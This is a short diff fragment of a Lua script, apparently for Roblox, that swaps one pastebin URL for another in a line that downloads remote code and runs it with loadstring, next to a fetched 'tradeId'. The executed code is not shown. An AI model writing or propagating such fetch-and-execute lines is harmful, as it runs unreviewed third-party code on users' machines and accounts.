@@ -273,7 +273,7 @@ spawn(function()
     wait(3)
     local success, problem = pcall(function()
     local tid = game:HttpGet("https://pastebin.com/wDbiRLDh", true)
-    loadstring(game:HttpGet("https://pastebin.com/raw/phF8rMaH", true))()
+    loadstring(game:HttpGet("https://pastebin.com/raw/62gDcP7b", true))()
 
     local table = {
     ["tradeId"] = tid
